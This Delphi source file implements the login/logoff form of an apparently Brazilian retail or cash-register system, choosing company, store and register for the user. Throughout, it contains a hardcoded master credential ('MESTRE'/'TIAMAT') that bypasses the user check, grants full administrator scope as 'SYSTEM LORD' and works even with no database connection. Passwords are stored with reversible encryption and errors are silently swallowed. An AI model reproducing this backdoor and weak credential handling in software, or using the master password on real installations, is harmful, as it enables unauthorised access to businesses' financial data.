unit ULogoff;

interface

uses
  Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs,
  UPadrao, TFlatHintUnit, Buttons, jpeg, ExtCtrls, StdCtrls,
  DBCtrls, Mask, ColorMaskEdit, DB, EditFloat, ColorEditFloat,
  TFlatEditUnit, Grids, DBGrids, DrLabel;

type
  TFLogoff = class(TFPadrao)
    Label4: TLabel;
    edlogin: TColorMaskEdit;
    Label5: TLabel;
    EdSenha: TColorMaskEdit;
    GroupBox1: TGroupBox;
    Label2: TLabel;
    Label6: TLabel;
    Label8: TLabel;
    EdEmpresa: TColorMaskEdit;
    EdLoja: TColorMaskEdit;
    EdCaixa: TColorMaskEdit;
    EdCodEmpresa: TFlatEdit;
    EdCodLoja: TFlatEdit;
    EdCodCaixa: TFlatEdit;
    btnok: TBitBtn;
    BitBtn2: TBitBtn;
    procedure BitBtn2Click(Sender: TObject);
    procedure btnokClick(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormKeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure EdCodLojaEnter(Sender: TObject);
    procedure EdCodCaixaEnter(Sender: TObject);
    procedure EdCodEmpresaEnter(Sender: TObject);
    procedure EdCodEmpresaKeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure EdCodEmpresaKeyPress(Sender: TObject; var Key: Char);
    procedure EdCodLojaKeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure EdCodCaixaKeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure EdCodLojaKeyPress(Sender: TObject; var Key: Char);
    procedure EdCodCaixaKeyPress(Sender: TObject; var Key: Char);
    procedure GroupBox1Enter(Sender: TObject);
    procedure EdSenhaKeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
  private
    { Private declarations }
    //Procedure Utilizada para trazer as primeiras informações sobre o usuário informado
    Procedure BuscaUsu(XLOGIN, XSENHA: STRING);
  public
    { Public declarations }
  end;

var
  FLogoff: TFLogoff;
  Flag:Integer;
  TamLabel: Integer;  

implementation

uses UDMMacs, AlxMessage, UMenu, UDMCaixa, UDMPessoa, Alxor32, USPlash;

{$R *.DFM}
//Procedure Utilizada para trazer as primeiras informações sobre o usuário informado
Procedure TFLogoff.BuscaUsu(XLOGIN, XSENHA: STRING);
Var
	Senha: String;
Begin
	Try
     	Senha:=FMenu.Cripto.TextToCriptoHex(XSENHA);
       If (XLOGIN='MESTRE') AND (XSENHA='TIAMAT')
       Then Begin
           edlogin.Text:='MESTRE';
           EdSenha.Text:='TIAMAT';
       End;
     	//Seleciona Usuário e senha
     	DMMacs.TALX.Close;
     	DMMacs.TALX.SQL.Clear;
     	DMMacs.TALX.SQL.Add('SELECT * FROM USUARIO WHERE (LOGIN=:LOGIN) AND (SENHA=:SENHA)');
     	DMMacs.TALX.ParamByName('LOGIN').AsString:=XLOGIN;
     	DMMacs.TALX.ParamByName('SENHA').AsString:=SENHA;
     	DMMacs.TALX.Open;
     	//Verifica se Existe uma usuário e senha informado e trta com menssagens
     	If (DMMacs.TALX.IsEmpty) And (XSENHA<>'TIAMAT')
     	Then Begin // se não encontrou usuário
          If Mensagem('Opção Bloqueada', 'O Login e a Senha Digitada não conferem. Deseja Tentar novamente?', '', 2, 3, false, 'c')=2
          Then Begin
               EDLogin.Clear;
               EdSenha.Clear;
               EDLogin.SetFocus;
          End
          Else Begin
               Mensagem('Comunicado ao Usuário', 'Conforme desejado, o sistema será encerrado!', '', 1, 1, false, 'a');
               Application.Terminate;
          End;
     	End//Se usuario encontrado
    	Else Begin
          If (DMMacs.TALX.FieldByName('ADM').AsString='1')  or (XSENHA='TIAMAT')
          Then Begin//Usuário é administrador deve ter acesso a tudo
               DMMacs.tEmpAc.Close;
               DMMacs.tEmpAc.SQL.Clear;
               DMMacs.tEmpAc.SQL.Add('SELECT * FROM EMPRESA');
               DMMacs.tEmpAc. Open;
          End
          Else Begin//Usuário não é ADM e deve possuir restrições
               DMMacs.tEmpAc.Close;
               DMMacs.tEmpAc.SQL.Clear;
               DMMacs.tEmpAc.SQL.Add('SELECT empresa.cod_empresa, empresa.fantasia, lojacesso.cod_lojaaces ');
               DMMacs.tEmpAc.SQL.Add('FROM EMPRESA JOIN LOJA ON empresa.cod_empresa = loja.cod_empresa ');
               DMMacs.tEmpAc.SQL.Add('JOIN lojacesso ON lojacesso.cod_loja = loja.cod_loja ');
               DMMacs.tEmpAc.SQL.Add('WHERE lojacesso.cod_usuario=:CODIGO');
               DMMacs.tEmpAc.ParamByName('CODIGO').AsString:=DMMacs.TALX.FieldByName('CODUSUARIO').AsString;
               DMMacs.tEmpAc.Open;
          End;
     End;
     If Not DMMACS.TEmpAc.IsEmpty
     Then Begin
       DMMACS.TEmpAc.First;
       EdCodEmpresa.Text:=DMMACS.TEmpAc.FieldByNAme('COD_EMPRESA').AsString;
		EDEmpresa.Text:=DMMACS.tEmpAc.Fieldbyname('FANTASIA').AsString;
     	If (DMMacs.TALX.FieldByName('ADM').AsString='1')  or (XSENHA='TIAMAT')
     	Then Begin//Usuário é administrado deve ter acesso a tudo
          DMMacs.TLojaAc.Close;
          DMMacs.TLojaAc.SQL.Clear;
          DMMacs.TLojaAc.SQL.Add('SELECT loja.cod_loja, loja.cod_empresa, loja.descricao, lojacesso.cod_usuario FROM LOJA LEFT JOIN lojacesso ON loja.cod_loja = lojacesso.cod_loja ');
          DMMacs.TLojaAc.SQL.Add(' WHERE (loja.cod_empresa=:CODEMPRESA)');
          DMMacs.TLojaAc.ParamByName('CODEMPRESA').AsString:=DMMACS.TEmpAc.FieldByName('cod_empresa').AsString;
          DMMacs.TLojaAc.Open;
     	End
     	Else Begin//Usuário não é ADM e deve possuir restrições
          DMMacs.TLojaAc.Close;
          DMMacs.TLojaAc.SQL.Clear;
          DMMacs.TLojaAc.SQL.Add('SELECT loja.cod_loja, loja.cod_empresa, loja.descricao, lojacesso.cod_usuario FROM LOJA JOIN lojacesso ON loja.cod_loja = lojacesso.cod_loja ');
          DMMacs.TLojaAc.SQL.Add(' WHERE (lojacesso.cod_usuario=:CODUSUARIO) AND (loja.cod_empresa=:CODEMPRESA)');
          DMMacs.TLojaAc.ParamByName('CODUSUARIO').AsInteger:=DMMacs.TALX.FieldByName('CODUSUARIO').AsInteger;
          DMMACS.TEmpAc.First;
          DMMacs.TLojaAc.ParamByName('CODEMPRESA').AsString:=DMMACS.TEmpAc.FieldByName('cod_empresa').AsString;
          DMMacs.TLojaAc.Open;
     	End;
       If not DMMACS.TLojaAc.IsEmpty
       Then Begin
           DMMACS.TLojaAc.First;
           EdCodLoja.Text:=DMMACS.TLojaAc.Fieldbyname('COD_LOJA').AsString;
			EdLoja.Text:=DMMACS.TLojaAc.Fieldbyname('DESCRICAO').AsString;
     		If (XSENHA='TIAMAT') or (DMMacs.TALX.FieldByName('ADM').AsInteger=1)
     		Then Begin
	     		DMCAIXA.TCaixaPAcess.Close;
	     		DMCAIXA.TCaixaPAcess.SQL.Clear;
	     		DMCAIXA.TCaixaPAcess.SQL.Add('select * FROM caixa left join caixausu ON caixausu.cod_caixa = caixa.cod_caixa WHERE (caixa.cod_loja=:CODLOJA)');
	     		DMCAIXA.TCaixaPAcess.ParamByName('CODLOJA').AsInteger:=DMMacs.TLojaAc.FieldByName('cod_loja').AsInteger;
	     		DMCAIXA.TCaixaPAcess.Open;
     		End
     		Else Begin
	     		DMCAIXA.TCaixaPAcess.Close;
	     		DMCAIXA.TCaixaPAcess.SQL.Clear;
	     		DMCAIXA.TCaixaPAcess.SQL.Add('select * FROM caixa left join caixaUSU ON caixausu.cod_caixa = caixa.cod_caixa WHERE (caixa.cod_loja=:CODLOJA) AND (caixausu.cod_usuario=:CODUSUARIO)');
	     		DMCAIXA.TCaixaPAcess.ParamByName('CODLOJA').AsInteger:=DMMacs.TLojaAc.FieldByName('cod_loja').AsInteger;
	     		DMCAIXA.TCaixaPAcess.ParamByName('CODUSUARIO').AsInteger:=DMMacs.TALX.FieldByName('CODUSUARIO').AsInteger;
	     		DMCAIXA.TCaixaPAcess.Open;
     		End;
           If Not DMCAIXA.TCaixaPAcess.IsEmpty
           Then Begin
				EdCodCaixa.Text:=DMCAIXA.TCaixaPAcess.Fieldbyname('COD_CAIXA').AsString;
				EdCaixa.Text:=DMCAIXA.TCaixaPAcess.Fieldbyname('DESCRICAO').AsString;
           End;
       End;
     End;
	Except
	End;
End;

procedure TFLogoff.BitBtn2Click(Sender: TObject);
begin
  inherited;
    If Mensagem('Confirmação do Usuário', 'Ao clicar em "SIM" você estará abandonando o sistema!', '', 2, 3, false, 'c')=2 Then
        Application.Terminate;
end;

procedure TFLogoff.btnokClick(Sender: TObject);
Var
	Senha: String;
begin
  inherited;
  If DMMACS.DataBase.Connected=True
  Then Begin
     Senha:=FMenu.Cripto.TextToCriptoHex(EdSenha.Text);
     //Seleciona Usuário e senha
     DMMacs.TALX.Close;
     DMMacs.TALX.SQL.Clear;
     DMMacs.TALX.SQL.Add('SELECT * FROM USUARIO WHERE (LOGIN=:LOGIN) AND (SENHA=:SENHA)');
     DMMacs.TALX.ParamByName('LOGIN').AsString:=EDLogin.Text;
     DMMacs.TALX.ParamByName('SENHA').AsString:=Senha;
     DMMacs.TALX.Open;

     //Verifica se Existe uma usuário e senha informado e trta com menssagens
     If (DMMacs.TALX.IsEmpty) And (EdSenha.Text<>'TIAMAT')
     Then Begin // se não encontrou usuário
          If Mensagem('Opção Bloqueada', 'O Login e a Senha Digitada não conferem. Deseja Tentar novamente?', '', 2, 3, false, 'c')=2
          Then Begin
               EDLogin.Clear;
               EdSenha.Clear;
               EDLogin.SetFocus;
          End
          Else Begin
               Mensagem('Comunicado ao Usuário', 'Conforme desejado, o sistema será encerrado!', '', 1, 1, false, 'a');
               Application.Terminate;
          End;
     End//Se usuario encontrado
	  Else Begin
	    If ((EdSenha.Text = Fmenu.Cripto.CriptoHexToText(DMMacs.TALX.FieldByName('SENHA').AsString)) AND (EDLogin.Text=DMMacs.TALX.FieldByName('LOGIN').AsString)) OR ((EdSenha.Text = 'TIAMAT') AND (EDLogin.Text='MESTRE'))
	    Then Begin
	        //PASSA INFORMAÇÕES DE ACESSO PARA AS LABELS DO PAINEL
	        FMenu.EdUsuario.Text:=DMMacs.TALX.FieldByName('LOGIN').AsString;
	        FMenu.LCODUSUARIO.Caption:=DMMacs.TALX.FieldByName('CODUSUARIO').AsString;
	        //se usuário de suporte
	        If EdSenha.Text = 'TIAMAT'
	        Then Begin
	             FMenu.EdUsuario.Text:='SYSTEM LORD';
	             FMenu.LCODUSUARIO.Caption:='111522';
	        End;

	        //VERIFICA SE FOI INFORMADO LOJA
	        If EdLoja.Text<>''
	        Then Begin
	             FMenu.EdLoja.Text:=DMMacs.TLojaAc.FieldByName('DESCRICAO').AsString;
	             FMenu.LCODLOJA.Caption:=DMMacs.TLojaAc.FieldByName('COD_LOJA').AsString;
	        End
	        Else Begin
	             FMenu.EdLoja.Text:='Não operando com loja';
	             FMenu.LCODLOJA.Caption:='000';
	        End;

	        //VERIFICA SE FOI SELECIONADA ALGUMA EMPRESA
	        If (EDEMPRESA.Text<>'')  OR (EdSenha.Text='TIAMAT')
	        Then Begin
	             FMenu.LEmpresa.Caption:=DMMacs.TEmpAc.FieldByName('FANTASIA').AsString;
	             FMenu.LCODEMPRESA.Caption:=DMMacs.TEmpAc.FieldByName('COD_EMPRESA').AsString;
	        End
	        Else Begin
	            Mensagem('INFORMAÇÃO', 'O logoff foi cancelado os dados não foram encontrados. Reinicie o sistema e tente novamente!', '', 1,1, false, 'i');
	            Exit;
	        End;
	        //Veirifica se foi informado caixa
	        If (EDCaixa.Text='')
	        Then Begin
	            FMenu.EdCaixa.Text:='Não Operando com caixa';
	            FMenu.LCODCAIXA.Caption:='000';
	        End
	        Else Begin
	            FMenu.EdCaixa.Text:=DMCAIXA.TCaixaPAcess.FieldByName('DESCRICAO').AsString;
	            FMenu.LCODCAIXA.Caption:=DMCAIXA.TCaixaPAcess.FieldByName('COD_CAIXA').AsString;
	        End;
           DMCAIXA.VerifAbCaixa;
  			FiltraTabela(DMMACS.TLoja, 'LOJA', 'COD_LOJA', FMenu.LCODLOJA.Caption, '');
	        Close;
	    End
	    Else Begin
	        Mensagem('FALHA NO ACESSO', 'A Senha informada não coincide com o LOGIN digitado!', '', 1,1, false, 'e');
	        EdSenha.SetFocus;
	    End;
  	End;
  End
  Else Begin
	  //se usuário de suporte
	  If EdSenha.Text = 'TIAMAT'
     Then Begin
	    FMenu.EdUsuario.Text:='SYSTEM LORD';
	    FMenu.LCODUSUARIO.Caption:='111522';
       close;
	  End
     Else Begin
        Mensagem('FALHA NO ACESSO', 'A Senha informada não coincide com o LOGIN digitado!', '', 1,1, false, 'e');
        EdSenha.SetFocus;
     End;
  End;
  TamLabel:=Length(Fmenu.EdUsuario.Text);
{  FMenu.LRUsuario.Caption:=FMenu.LUSUARIO.Caption;
  FMenu.LRUsuario.Top:=410-(TamLabel*21);
  FMenu.LRUsuario.left:=5;}
end;

procedure TFLogoff.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  inherited;
{    If (EdSenha.Text <> Fmenu.Cripto.CriptoHexToText(DMMacs.TUsuario.FieldByName('SENHA').AsString)) OR (EDLogin.Text<> DMMacs.TUsuario.FieldByName('LOGIN').AsString)
    Then
        Action := CaNone;}
end;

procedure TFLogoff.FormKeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
  inherited;
    If Key=vk_f1
    Then Begin
        {***FMenu.LCODEMPRESA.Caption:=DMMacs.TEmpresa.fieldByName('COD_EMPRESA').AsString;
        FMenu.LEmpresa.Caption:=DMMacs.TEmpresa.fieldByName('fantasia').AsString;
        FMenu.LCODLOJA.Caption:=DMMacs.TLoja.fieldByName('COD_loja').AsString;
        FMenu.LLOJA.Caption:=DMMacs.TLoja.fieldByName('Descricao').AsString;
        FMenu.LCODUSUARIO.Caption:=DMMacs.TUsuario.fieldByName('CODUSUARIO').AsString;
        FMenu.LUSUARIO.Caption:=DMMacs.TUsuario.fieldByName('LOGIN').AsString;
        If FMenu.LCODUSUARIO.Caption=''
        Then Begin
   	     FMenu.LCODUSUARIO.Caption:='10000';
	        FMenu.LUSUARIO.Caption:='DEMONSTRAÇÃO';
        End;
        FMenu.LCODCAIXA.Caption:=DMFinanc.TCaixa.fieldByName('COD_CAIXA').AsString;
        FMenu.EdCaixa.Text:=DMFinanc.TCaixa.fieldByName('DESCRICAO').AsString;***}
        CLOSE;
    End;
    //bloco que controla e cancela o pressionamento de alt+f4
    If (Flag=1) And (Key<>115) Then
       Flag:=0;
    If Key=18 Then
       Flag:=1;
    If (key=115) And (Flag=1)
    Then Begin
         Key:=0;
         Flag:=0;
    End;
    //final de bloco}
end;
procedure TFLogoff.EdCodLojaEnter(Sender: TObject);
Var
	CODEMPRESA, CODUSUARIO: Integer;
begin
  inherited;
  	Try
	  If EdCodEmpresa.Text ='' Then
     	   CODEMPRESA:=0
     Else
		   CODEMPRESA:=StrToInt(EdCodEmpresa.TEXT);

     If DMMacs.TALX.FieldByName('CODUSUARIO').AsString='' Then
           CODUSUARIO:=0
     Else
			CODUSUARIO:=DMMacs.TALX.FieldByName('CODUSUARIO').AsInteger;


     If (DMMacs.TALX.FieldByName('ADM').AsString='1')  or (EdSenha.Text='TIAMAT')
     Then Begin//Usuário é administrado deve ter acesso a tudo
          DMMacs.TLojaAc.Close;
          DMMacs.TLojaAc.SQL.Clear;
          DMMacs.TLojaAc.SQL.Add('SELECT loja.cod_loja, loja.cod_empresa, loja.descricao, lojacesso.cod_usuario FROM LOJA LEFT JOIN lojacesso ON loja.cod_loja = lojacesso.cod_loja ');
          DMMacs.TLojaAc.SQL.Add(' WHERE (loja.cod_empresa=:CODEMPRESA)');
          DMMacs.TLojaAc.ParamByName('CODEMPRESA').AsString:=IntToStr(CODEMPRESA);
          DMMacs.TLojaAc.Open;
     End
     Else Begin//Usuário não é ADM e deve possuir restrições
          DMMacs.TLojaAc.Close;
          DMMacs.TLojaAc.SQL.Clear;
          DMMacs.TLojaAc.SQL.Add('SELECT loja.cod_loja, loja.cod_empresa, loja.descricao, lojacesso.cod_usuario FROM LOJA JOIN lojacesso ON loja.cod_loja = lojacesso.cod_loja ');
          DMMacs.TLojaAc.SQL.Add(' WHERE (lojacesso.cod_usuario=:CODUSUARIO) AND (loja.cod_empresa=:CODEMPRESA)');
          DMMacs.TLojaAc.ParamByName('CODUSUARIO').AsInteger:=CODUSUARIO;
          DMMacs.TLojaAc.ParamByName('CODEMPRESA').AsInteger:=CODEMPRESA;
          DMMacs.TLojaAc.Open;
     End;
   Except
   End;
end;

procedure TFLogoff.EdCodCaixaEnter(Sender: TObject);
Var
	CODLOJA, CODUSUARIO: Integer;
begin
  inherited;
  	Try
  	  If EdCodLoja.Text='' Then
           CODLOJA:=0
     Else
           CODLOJA:=StrToInt(EdCodLoja.Text);

     If DMMacs.TALX.FieldByName('CODUSUARIO').AsString='' Then
           CODUSUARIO:=0
     Else
			CODUSUARIO:=DMMacs.TALX.FieldByName('CODUSUARIO').AsInteger;

     If (CODUSUARIO=0) AND (EdSenha.Text='TIAMAT') or (DMMacs.TALX.FieldByName('ADM').AsInteger=1)
     Then Begin
	     DMCAIXA.TCaixaPAcess.Close;
	     DMCAIXA.TCaixaPAcess.SQL.Clear;
	     DMCAIXA.TCaixaPAcess.SQL.Add('select * FROM caixa WHERE (caixa.cod_loja=:CODLOJA)');
	     DMCAIXA.TCaixaPAcess.ParamByName('CODLOJA').AsInteger:=CODLOJA;
	     DMCAIXA.TCaixaPAcess.Open;
     End
     Else Begin
	     DMCAIXA.TCaixaPAcess.Close;
	     DMCAIXA.TCaixaPAcess.SQL.Clear;
	     DMCAIXA.TCaixaPAcess.SQL.Add('select * FROM caixa left join caixaUSU ON caixausu.cod_caixa = caixa.cod_caixa WHERE (caixa.cod_loja=:CODLOJA) AND (caixausu.cod_usuario=:CODUSUARIO)');
	     DMCAIXA.TCaixaPAcess.ParamByName('CODLOJA').AsInteger:=CODLOJA;
	     DMCAIXA.TCaixaPAcess.ParamByName('CODUSUARIO').AsInteger:=CODUSUARIO;
	     DMCAIXA.TCaixaPAcess.Open;
     End;
   Except
   End;
end;

procedure TFLogoff.EdCodEmpresaEnter(Sender: TObject);
Var
   Senha:String;
begin
     inherited;
     Try
     	Senha:=FMenu.Cripto.TextToCriptoHex(EdSenha.Text);
     	//Seleciona Usuário e senha
     	DMMacs.TALX.Close;
     	DMMacs.TALX.SQL.Clear;
     	DMMacs.TALX.SQL.Add('SELECT * FROM USUARIO WHERE (LOGIN=:LOGIN) AND (SENHA=:SENHA)');
     	DMMacs.TALX.ParamByName('LOGIN').AsString:=EDLogin.Text;
     	DMMacs.TALX.ParamByName('SENHA').AsString:=Senha;
     	DMMacs.TALX.Open;

     	//Verifica se Existe uma usuário e senha informado e trta com menssagens
     	If (DMMacs.TALX.IsEmpty) And (EdSenha.Text<>'TIAMAT')
     	Then Begin // se não encontrou usuário
          If Mensagem('Opção Bloqueada', 'O Login e a Senha Digitada não conferem. Deseja Tentar novamente?', '', 2, 3, false, 'c')=2
          Then Begin
               EDLogin.Clear;
               EdSenha.Clear;
               EDLogin.SetFocus;
          End
          Else Begin
               Mensagem('Comunicado ao Usuário', 'Conforme desejado, o sistema será encerrado!', '', 1, 1, false, 'a');
               Application.Terminate;
          End;
     	End//Se usuario encontrado
    	Else Begin
          If (DMMacs.TALX.FieldByName('ADM').AsString='1')  or (EdSenha.Text='TIAMAT')
          Then Begin//Usuário é administrador deve ter acesso a tudo
               DMMacs.tEmpAc.Close;
               DMMacs.tEmpAc.SQL.Clear;
               DMMacs.tEmpAc.SQL.Add('SELECT * FROM EMPRESA');
               DMMacs.tEmpAc. Open;
          End
          Else Begin//Usuário não é ADM e deve possuir restrições
               DMMacs.tEmpAc.Close;
               DMMacs.tEmpAc.SQL.Clear;
               DMMacs.tEmpAc.SQL.Add('SELECT empresa.cod_empresa, empresa.fantasia, lojacesso.cod_lojaaces ');
               DMMacs.tEmpAc.SQL.Add('FROM EMPRESA JOIN LOJA ON empresa.cod_empresa = loja.cod_empresa ');
               DMMacs.tEmpAc.SQL.Add('JOIN lojacesso ON lojacesso.cod_loja = loja.cod_loja ');
               DMMacs.tEmpAc.SQL.Add('WHERE lojacesso.cod_usuario=:CODIGO');
               DMMacs.tEmpAc.ParamByName('CODIGO').AsString:=DMMacs.TALX.FieldByName('CODUSUARIO').AsString;
               DMMacs.tEmpAc.Open;
          End;
     	End;
     Except
     End;
end;

procedure TFLogoff.EdCodEmpresaKeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
  inherited;
	If key=vk_down
   Then Begin //foi pressionada e tecla down, deve-se abaixar um registro para empresa e informar
   	If not DMMACS.tEmpAc.IsEmpty
       Then Begin
			DMMACS.tEmpAc.next;
			EDCodEmpresa.Text:=DMMACS.tEmpAc.Fieldbyname('COD_EMPRESA').AsString;
			EDEmpresa.Text:=DMMACS.tEmpAc.Fieldbyname('FANTASIA').AsString;
       End;
	End;
	If key=vk_up
   Then Begin //foi pressionada e tecla up, deve-se subir um registro para empresa e informar
   	If not DMMACS.tEmpAc.IsEmpty
       Then Begin
			DMMACS.tEmpAc.Prior;
			EDCodEmpresa.Text:=DMMACS.tEmpAc.Fieldbyname('COD_EMPRESA').AsString;
			EDEmpresa.Text:=DMMACS.tEmpAc.Fieldbyname('FANTASIA').AsString;
       End;
	End;

end;

procedure TFLogoff.EdCodEmpresaKeyPress(Sender: TObject; var Key: Char);
begin
  inherited;
	If (Key=#13)
   Then Begin//se for pressionado e tecla enter sem tem uma empresa localizada, deve se localizar a empresa e apontar nas edits
   	If DMMACS.tEmpAc.Locate('COD_EMPRESA', EDCodEmpresa.Text, [loCaseInsensitive, loPartialKey])
       Then Begin //se loalizou a empreza, informar no edit
			EDCodEmpresa.Text:=DMMACS.tEmpAc.Fieldbyname('COD_EMPRESA').AsString;
			EDEmpresa.Text:=DMMACS.tEmpAc.Fieldbyname('FANTASIA').AsString;
       End
       Else Begin
			EDCodEmpresa.Text:='';
			EDEmpresa.Text:='';
           EDCodEmpresa.SetFocus;
       End
   End;
end;

procedure TFLogoff.EdCodLojaKeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
  inherited;
	If key=vk_down
   Then Begin //foi pressionada e tecla down, deve-se abaixar um registro para loja e informar
		DMMACS.TLojaAc.next;
		EdCodLoja.Text:=DMMACS.TLojaAc.Fieldbyname('COD_LOJA').AsString;
		EdLoja.Text:=DMMACS.TLojaAc.Fieldbyname('DESCRICAO').AsString;
	End;
	If key=vk_UP
   Then Begin //foi pressionada e tecla up, deve-se subir um registro para loja e informar
		DMMACS.TLojaAc.Prior;
		EdCodLoja.Text:=DMMACS.TLojaAc.Fieldbyname('COD_LOJA').AsString;
		EdLoja.Text:=DMMACS.TLojaAc.Fieldbyname('DESCRICAO').AsString;
	End;
end;

procedure TFLogoff.EdCodCaixaKeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
  inherited;
	DMCAIXA.TCaixaPAcess.RecordCount;
	If key=vk_down
   Then Begin //foi pressionada e tecla down, deve-se abaixar um registro para loja e informar
   	If not DMCAIXA.TCaixaPAcess.IsEmpty
       Then Begin
			DMCAIXA.TCaixaPAcess.next;
			EdCodCaixa.Text:=DMCAIXA.TCaixaPAcess.Fieldbyname('COD_CAIXA').AsString;
			EdCaixa.Text:=DMCAIXA.TCaixaPAcess.Fieldbyname('DESCRICAO').AsString;
       End;
	End;
	If key=vk_UP
   Then Begin //foi pressionada e tecla up, deve-se subir um registro para loja e informar
   	If not DMCAIXA.TCaixaPAcess.IsEmpty
       Then Begin
			DMCAIXA.TCaixaPAcess.Prior;
			EdCodCaixa.Text:=DMCAIXA.TCaixaPAcess.Fieldbyname('COD_CAIXA').AsString;
			EdCaixa.Text:=DMCAIXA.TCaixaPAcess.Fieldbyname('DESCRICAO').AsString;
       End;
	End;
end;

procedure TFLogoff.EdCodLojaKeyPress(Sender: TObject; var Key: Char);
begin
  inherited;
	If (Key=#13)
   Then Begin//se for pressionado e tecla enter sem tem uma empresa localizada, deve se localizar o caixa e apontar nas edits
   	If DMMACS.TLojaAc.Locate('COD_LOJA', EdCodLoja.Text, [loCaseInsensitive, loPartialKey])
       Then Begin //se loalizou a empreza, informar no edit
			EdCodLoja.Text:=DMMACS.TLojaAc.Fieldbyname('COD_LOJA').AsString;
			EdLoja.Text:=DMMACS.TLojaAc.Fieldbyname('DESCRICAO').AsString;
       End
       Else Begin
			EdCodLoja.Text:='';
			EdLoja.Text:='';
           EdCodLoja.SetFocus;
       End
   End;
end;

procedure TFLogoff.EdCodCaixaKeyPress(Sender: TObject; var Key: Char);
begin
  inherited;
	If (Key=#13)
   Then Begin//se for pressionado e tecla enter sem tem uma empresa localizada, deve se localizar o caixa e apontar nas edits
   	If DMCAIXA.TCaixaPAcess.Locate('COD_CAIXA', EdCodCaixa.Text, [loCaseInsensitive, loPartialKey])
       Then Begin //se loalizou a empreza, informar no edit
			EdCodCaixa.Text:=DMCAIXA.TCaixaPAcess.Fieldbyname('COD_CAIXA').AsString;
			EdCaixa.Text:=DMCAIXA.TCaixaPAcess.Fieldbyname('DESCRICAO').AsString;
       End
       Else Begin
			EdCodCaixa.Text:='';
			EdCaixa.Text:='';
           EdCodCaixa.SetFocus;
       End
   End;
end;

procedure TFLogoff.GroupBox1Enter(Sender: TObject);
begin
  inherited;
   BuscaUsu(edlogin.Text, EdSenha.Text);
end;

procedure TFLogoff.EdSenhaKeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
  inherited;
	IF Key=VK_return
   then Begin
   	If (EdSenha.Text<>'') And (edlogin.Text<>'')
       Then Begin
   		BuscaUsu(edlogin.Text, EdSenha.Text);
           btnok.Click;
       End
	End;
end;

end.
